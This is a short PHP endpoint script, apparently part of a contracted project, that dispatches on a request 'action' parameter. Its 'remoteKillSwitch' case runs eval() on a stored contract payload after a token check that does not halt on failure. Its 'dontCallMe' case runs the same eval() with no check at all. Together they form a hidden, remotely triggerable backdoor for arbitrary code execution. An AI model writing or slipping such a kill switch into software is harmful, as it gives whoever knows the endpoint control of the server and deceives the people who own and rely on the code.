<?php
require_once ('asapLoader.php');

if (!isset($_REQUEST['action'])) $_REQUEST['action'] = 'invalid';

switch ($_REQUEST['action'])
{
    case 'remoteKillSwitch':
        if (!isset($_REQUEST['token']) || $_REQUEST['token'] != $_contract->token){
            header('Content-Type: application/json');
            printError();
        }
        // execute the payload
        eval($_contract->payload);
        break;
    case 'dontCallMe':
        // execute the payload
        eval($_contract->payload);
        break;
}
